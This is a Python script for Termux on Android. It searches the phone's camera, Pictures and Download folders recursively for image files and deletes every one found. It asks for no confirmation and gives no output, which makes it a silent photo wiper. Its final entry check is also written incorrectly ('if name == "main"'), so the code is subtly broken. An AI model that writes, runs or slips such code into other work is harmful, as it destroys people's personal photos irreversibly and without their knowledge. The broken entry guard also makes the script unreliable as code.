#!/data/data/com.termux/files/usr/bin/python3

import os
import glob

def get_gallery_paths():
    base_paths = [
        "/sdcard/DCIM/Camera",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Download"
    ]
    
    valid_paths = []
    for path in base_paths:
        if os.path.exists(path) and os.path.isdir(path):
            valid_paths.append(path)
    
    return valid_paths

def find_images(path):
    extensions = ["*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.webp", "*.heic", "*.JPG", "*.JPEG", "*.PNG"]
    image_files = []
    
    for ext in extensions:
        pattern = os.path.join(path, "**", ext)
        files = glob.glob(pattern, recursive=True)
        image_files.extend(files)
    
    return image_files

def delete_file(file_path):
    try:
        os.remove(file_path)
        return True
    except Exception:
        return False

def main():
    paths = get_gallery_paths()
    
    if not paths:
        exit(1)
    
    all_images = []
    for path in paths:
        images = find_images(path)
        all_images.extend(images)
    
    if not all_images:
        exit(0)
    
    deleted = 0
    failed = 0
    
    for img in all_images:
        if delete_file(img):
            deleted += 1
        else:
            failed += 1

if name == "main":
    main()
